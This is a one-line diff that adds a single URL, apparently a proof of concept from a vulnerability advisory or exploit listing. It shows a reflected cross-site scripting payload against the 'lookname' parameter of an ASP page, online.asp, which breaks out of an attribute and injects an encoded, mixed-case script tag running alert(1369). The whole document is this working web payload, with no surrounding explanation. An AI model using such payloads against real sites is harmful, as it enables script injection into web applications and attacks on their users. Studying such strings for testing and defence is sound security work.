@@ -1,0 +1,1 @@
+http://www.example.com/[Path]/online.asp?lookname=&amp;gt;&amp;quot;&amp;gt;&amp;lt;ScRiPt%20%0a%0d&amp;gt;alert(1369)%3B&amp;lt;/ScRiPt&amp;gt;
